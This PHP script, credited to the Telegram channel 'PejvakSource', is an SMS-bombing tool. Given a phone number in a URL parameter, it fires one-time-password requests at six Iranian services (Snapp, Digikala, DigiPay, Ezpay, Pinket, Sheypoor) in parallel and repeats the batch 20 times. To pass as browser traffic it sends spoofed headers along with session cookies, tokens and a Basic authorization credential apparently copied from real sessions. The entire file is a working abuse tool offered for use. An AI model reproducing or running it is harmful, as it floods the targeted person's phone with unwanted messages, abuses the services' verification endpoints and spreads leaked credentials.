<?php
// T.me/PejvakSource | پژواک سورس

class AsyncSend {
    public function Send($phone)
    {
        $Snapp = curl_init();
        curl_setopt($Snapp, CURLOPT_URL, 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp');
        curl_setopt($Snapp, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($Snapp, CURLOPT_POST, 1);
        curl_setopt($Snapp, CURLOPT_POSTFIELDS, '{"cellphone":"+98'.$phone.'"}');
        curl_setopt($Snapp, CURLOPT_ENCODING, 'gzip, deflate');
        $headers = array();
        $headers[] = 'Authority: app.snapp.taxi';
        $headers[] = 'Sec-Ch-Ua: ^^';
        $headers[] = 'X-App-Version: 5.0.1';
        $headers[] = 'Sec-Ch-Ua-Mobile: ?0';
        $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36';
        $headers[] = 'Content-Type: application/json';
        $headers[] = 'X-App-Name: passenger-pwa';
        $headers[] = 'Sec-Ch-Ua-Platform: ^^Windows^^\"\"';
        $headers[] = 'App-Version: pwa';
        $headers[] = 'Accept: */*';
        $headers[] = 'Origin: https://app.snapp.taxi';
        $headers[] = 'Sec-Fetch-Site: same-origin';
        $headers[] = 'Sec-Fetch-Mode: cors';
        $headers[] = 'Sec-Fetch-Dest: empty';
        $headers[] = 'Referer: https://app.snapp.taxi/login/?redirect_to=^%^2F^%^3Futm_source^%^3Dwebsite^%^26utm_medium^%^3Dwebapp-button^%^26utm_campaign^%^3Dbody';
        $headers[] = 'Accept-Language: en-US,en;q=0.9,fa;q=0.8';
        $headers[] = 'Cookie: _ga=GA1.2.2087606696.1644396254; _gid=GA1.2.92383985.1644396254; _gat=1; 6aeffda4232f672ea9c7728c3f26e931=abe99968841314d60564bf82272efc49; _gat_UA-62307682-13=1';
        curl_setopt($Snapp, CURLOPT_HTTPHEADER, $headers);
        $Digikala = curl_init();
        curl_setopt($Digikala, CURLOPT_URL, 'https://api.digikala.com/v1/user/authenticate/');
        curl_setopt($Digikala, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($Digikala, CURLOPT_POST, 1);
        curl_setopt($Digikala, CURLOPT_POSTFIELDS, '{"backUrl":"/","username":"0'.$phone.'"}');
        curl_setopt($Digikala, CURLOPT_ENCODING, 'gzip, deflate');
        $headers = array();
        $headers[] = 'Authority: api.digikala.com';
        $headers[] = 'Sec-Ch-Ua: ^^';
        $headers[] = 'Sec-Ch-Ua-Mobile: ?0';
        $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36';
        $headers[] = 'X-Web-Client: desktop';
        $headers[] = 'Content-Type: application/json';
        $headers[] = 'Accept: application/json, text/plain, */*';
        $headers[] = 'X-Web-Optimize-Response: 1';
        $headers[] = 'Sec-Ch-Ua-Platform: ^^Windows^^\"\"';
        $headers[] = 'Origin: https://www.digikala.com';
        $headers[] = 'Sec-Fetch-Site: same-site';
        $headers[] = 'Sec-Fetch-Mode: cors';
        $headers[] = 'Sec-Fetch-Dest: empty';
        $headers[] = 'Referer: https://www.digikala.com/';
        $headers[] = 'Accept-Language: en-US,en;q=0.9,fa;q=0.8';
        $headers[] = 'Cookie: __auc=7eb86fba17e0073540b2c4a72ec; _gac_UA-13212406-1=1.1641292538.Cj0KCQiA_c-OBhDFARIsAIFg3exby_wReK1t4-gu_4ISZPvpqYHzQ2IEe0FzK_NSwSUhL7ui9QY8KrIaAhBtEALw_wcB; _conv_r=s^%^3Awww.google.com*m^%^3Aorganic*t^%^3A*c^%^3A; Digikala:Token=QVgzS1FyYSs2akJ0c1JneDJidEh6QT09^%^26bTZGeWc0TmxaZHhkN3U1L3JpdWNVSE5BMjVWZVlqU3paMXBjZVhUc2VQRXR0Zm82RDl0UllYNnpaeng4M2QyRjgxbkxqbUdMS0VsaWxuQWxBeVVjVzh0aXN1dUNEbGN5WHlxMzJmdVhqeU9MaS9LV1ZuYi93ZlFnNlhYcGw2Wksra0JINjVoRUVYdkVKZDUzZDJQRmYrb0lORTV1UlpCWWNRN1NaUzc2eUxiOE12eHpWRW1iZ2N1M3cyWTY1a0R5SmR5TUVNK1pucWc5d2ZaVXF1M05FeVdGTzNBaDdDYVRvcXJaWno0RzdZNTNvbC92Tk93K1V2NnhoVEdCeTNGNDZRZEduVHVqdy8yWVhmT2lXWlE2QU9qOFl2TUpDWFh4YmM1aHVxVnFvdW5XQ0dEZ0xQaVdSVDhQNjFSc1NYZTdnZFFXVTBRSjNIcnBqeHZ5YWJ6ejlBPT0~; tracker_global=4FtuWREZ; _gcl_au=1.1.1490523727.1644412417; tracker_session=4FwuRbAQ; TS01e4b47a=01023105915f69847bd16ee1c68669adeb8d6d80da66acedcacef71ed3179f8d8e5f80fe85177fab6b3a46e8688dcadeba3488e54b9c331e1729d573b780d81af5c90a2ec45967ed9bf965270246ca3f1fa442926b; _ga=GA1.2.1061236011.1640685064; _gid=GA1.2.1232221786.1644412420; _gat_UA-13212406-1=1; _conv_v=vi^%^3A1*sc^%^3A11*cs^%^3A1644412420*fs^%^3A1640685068*pv^%^3A52*exp^%^3A^%^7B100026246.^%^7Bv.1-g.^%^7B^%^7D^%^7D^%^7D*ps^%^3A1644229271; _conv_s=si^%^3A11*sh^%^3A1644412420458-0.051232710952206384*pv^%^3A1; _ga_LR50FG4ELJ=GS1.1.1644412417.13.1.1644412431.46; _ga_4S04WR965Q=GS1.1.1644412417.13.1.1644412431.0';
        curl_setopt($Digikala, CURLOPT_HTTPHEADER, $headers);
        $DigiPay = curl_init();
        curl_setopt($DigiPay, CURLOPT_URL, 'https://app.mydigipay.com/digipay/api/users/send-sms');
        curl_setopt($DigiPay, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($DigiPay, CURLOPT_POST, 1);
        curl_setopt($DigiPay, CURLOPT_POSTFIELDS, '{"cellNumber":"0'.$phone.'","device":{"deviceId":"d520c7a8-421b-4563-b955-f5abc56b97ec","deviceModel":"WEB_BROWSER","deviceAPI":"WEB_BROWSER","osName":"WEB"}}');
        curl_setopt($DigiPay, CURLOPT_ENCODING, 'gzip, deflate');
        $headers = array();
        $headers[] = 'Sec-Ch-Ua: ^^';
        $headers[] = 'Agent: WEB';
        $headers[] = 'Sec-Ch-Ua-Mobile: ?0';
        $headers[] = 'Client-Version: 1.0.0';
        $headers[] = 'Authorization: Basic d2ViYXBwLWNsaWVudC1pZDp3ZWJhcHAtY2xpZW50LXNlY3JldC1kZWJlZTc5ZC1iMDRkLTQ3ZWYtOGVkNS1jMzJlMjRlYzgzNmU=';
        $headers[] = 'Content-Type: application/json';
        $headers[] = 'Accept: application/json';
        $headers[] = 'Referer: https://app.mydigipay.com/auth/login';
        $headers[] = 'Digipay-Version: 2022-02-12';
        $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36';
        $headers[] = 'Sec-Ch-Ua-Platform: ^^Windows^^\"\"';
        curl_setopt($DigiPay    , CURLOPT_HTTPHEADER, $headers);
        $Ezpay = curl_init();
        curl_setopt($Ezpay, CURLOPT_URL, 'https://app.ezpay.ir:8443/open/v1/user/validation-code');
        curl_setopt($Ezpay, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($Ezpay, CURLOPT_POST, 1);
        curl_setopt($Ezpay, CURLOPT_POSTFIELDS, '{"phoneNumber":"0'.$phone.'","os":"Windows","osVersion":"10","browser":"Chrome","browserVersion":"98.0.4758.82","ip":"'.$_SERVER['REMOTE_SERVER'].'","device":"","presenterCode":""}');
        curl_setopt($Ezpay, CURLOPT_ENCODING, 'gzip, deflate');
        $headers = array();
        $headers[] = 'Connection: keep-alive';
        $headers[] = 'Sec-Ch-Ua: ^^';
        $headers[] = 'Rejectunauthorized: false';
        $headers[] = 'Access-Control-Allow-Origin: *';
        $headers[] = 'Sec-Ch-Ua-Mobile: ?0';
        $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36';
        $headers[] = 'Content-Type: application/json';
        $headers[] = 'Client-Ip: 5.126.137.254';
        $headers[] = 'Accept: application/json, text/plain, */*';
        $headers[] = 'Sec-Ch-Ua-Platform: ^^Windows^^\"\"';
        $headers[] = 'Origin: https://app.ezpay.ir';
        $headers[] = 'Sec-Fetch-Site: same-site';
        $headers[] = 'Sec-Fetch-Mode: cors';
        $headers[] = 'Sec-Fetch-Dest: empty';
        $headers[] = 'Referer: https://app.ezpay.ir/';
        $headers[] = 'Accept-Language: en-US,en;q=0.9,fa;q=0.8';
        curl_setopt($Ezpay, CURLOPT_HTTPHEADER, $headers);
        $Pinket = curl_init();
        curl_setopt($Pinket, CURLOPT_URL, 'https://pinket.com/api/cu/v2/phone-verification');
        curl_setopt($Pinket, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($Pinket, CURLOPT_POST, 1);
        curl_setopt($Pinket, CURLOPT_POSTFIELDS, '{"phoneNumber":"0'.$phone.'"}');
        curl_setopt($Pinket, CURLOPT_ENCODING, 'gzip, deflate');
        $headers = array();
        $headers[] = 'Connection: keep-alive';
        $headers[] = 'Sec-Ch-Ua: ^^';
        $headers[] = 'X-Anonymous-Id: dd38ac1e-9274-487d-8d6b-c85c48046c8b';
        $headers[] = 'Sec-Ch-Ua-Mobile: ?0';
        $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36';
        $headers[] = 'Content-Type: application/json;charset=UTF-8';
        $headers[] = 'X-Anonymous-Uid: 90637c84-7312-45e0-ae9c-9cd52a13171d';
        $headers[] = 'X-Client: web';
        $headers[] = 'Sec-Ch-Ua-Platform: ^^Windows^^\"\"';
        $headers[] = 'Accept: */*';
        $headers[] = 'Origin: https://pinket.com';
        $headers[] = 'Sec-Fetch-Site: same-origin';
        $headers[] = 'Sec-Fetch-Mode: cors';
        $headers[] = 'Sec-Fetch-Dest: empty';
        $headers[] = 'Referer: https://pinket.com/auth/phoneNumber';
        $headers[] = 'Accept-Language: en-US,en;q=0.9,fa;q=0.8';
        $headers[] = 'Cookie: rl_user_id=RudderEncrypt^%^3AU2FsdGVkX19meCBtnpxlQ8fh3od6nMkKm^%^2BRH6qOtzWc^%^3D; rl_anonymous_id=RudderEncrypt^%^3AU2FsdGVkX19cEoPvzIzCPvXMCUmId1Bl36XxmBhwRzVmbLSaEDK12IV7JFiHAZihaPrcSDSoHb^%^2Fp5nHnDPsgow^%^3D^%^3D; rl_group_id=RudderEncrypt^%^3AU2FsdGVkX1^%^2B4bMF8SsEOxzp9QrAVBJTPJKGlBY9cufY^%^3D; rl_trait=RudderEncrypt^%^3AU2FsdGVkX1^%^2FD84V1uCoYGE530PxgtYTSQ2d7M3PvCpE^%^3D; rl_group_trait=RudderEncrypt^%^3AU2FsdGVkX18uARUbbv5H^%^2FIjerB52uIuhco^%^2FUyywbYAs^%^3D; rl_page_init_referrer=RudderEncrypt^%^3AU2FsdGVkX1^%^2Bz3DPLvwri0pbNdbEMl^%^2BjXxcnY2RlLGe8^%^3D; rl_page_init_referring_domain=RudderEncrypt^%^3AU2FsdGVkX19b^%^2BY4NL7p9CEBpaeKYS^%^2FYK7PaE9JLj8qI^%^3D; isShowNavAppLinkDownload=false; JSESSIONID=91FCD39A8097674ED27EBB80042FF548; _gcl_au=1.1.645147545.1644413021; gift=; _anonymousUid=90637c84-7312-45e0-ae9c-9cd52a13171d; _ga=GA1.2.1624171024.1644413021; _gid=GA1.2.88484964.1644413021; _gat_gtag_UA_140014518_1=1; currentBasketUid=e9d8e969-4c30-4091-8874-6f2a1c130a7f';
        curl_setopt($Pinket, CURLOPT_HTTPHEADER, $headers);
        $Sheypoor = curl_init();
        curl_setopt($Sheypoor, CURLOPT_URL, 'https://www.sheypoor.com/api/v10.0.0/auth/send');
        curl_setopt($Sheypoor, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($Sheypoor, CURLOPT_POST, 1);
        curl_setopt($Sheypoor, CURLOPT_POSTFIELDS, '{"username":"0'.$phone.'"}');
        curl_setopt($Sheypoor, CURLOPT_ENCODING, 'gzip, deflate');
        $headers = array();
        $headers[] = 'Authority: www.sheypoor.com';
        $headers[] = 'Sec-Ch-Ua: ^^';
        $headers[] = 'Accept: application/json';
        $headers[] = 'Content-Type: application/json;charset=UTF-8';
        $headers[] = 'Sec-Ch-Ua-Mobile: ?0';
        $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36';
        $headers[] = 'Sec-Ch-Ua-Platform: ^^Windows^^\"\"';
        $headers[] = 'Origin: https://www.sheypoor.com';
        $headers[] = 'Sec-Fetch-Site: same-origin';
        $headers[] = 'Sec-Fetch-Mode: cors';
        $headers[] = 'Sec-Fetch-Dest: empty';
        $headers[] = 'Referer: https://www.sheypoor.com/session';
        $headers[] = 'Accept-Language: en-US,en;q=0.9,fa;q=0.8';
        $headers[] = 'Cookie: plog=False; ts=4f0c8f095d7b136e3c6d776dd96e79ee; track_id=042e6a80823be82ad44767757e7a807a; AMP_TOKEN=^%^24NOT_FOUND; _ga=GA1.2.803602390.1644413175; _gid=GA1.2.1852153776.1644413175; _gat=1';
        curl_setopt($Sheypoor, CURLOPT_HTTPHEADER, $headers);
        $mh = curl_multi_init();
        curl_multi_add_handle($mh, $Snapp);
        curl_multi_add_handle($mh, $Sheypoor);
        curl_multi_add_handle($mh, $Pinket);
        curl_multi_add_handle($mh, $Ezpay);
        curl_multi_add_handle($mh, $DigiPay);
        curl_multi_add_handle($mh, $Digikala); 
            do { curl_multi_exec($mh, $active); } while ($active);
        curl_multi_remove_handle($mh, $Snapp);
        curl_multi_remove_handle($mh, $Sheypoor);
        curl_multi_remove_handle($mh, $Pinket);
        curl_multi_remove_handle($mh, $Ezpay);
        curl_multi_remove_handle($mh, $DigiPay);
        curl_multi_remove_handle($mh, $Digikala);
        curl_multi_close($mh);
    }
}
if (isset($_GET['phone'])) :
    for ($i=0; $i < 20; $i++) :
        try{
        $A = new AsyncSend();
        $A->Send($_GET['phone']);
        echo json_encode(['status'=>false,'message'=>'Ok Send !']);
        }catch(\Exception $e){
            echo json_encode(['status'=>false,'message'=>'Error : '.$e]);
        }
    endfor;
endif;

// T.me/PejvakSource | پژواک سورس

?>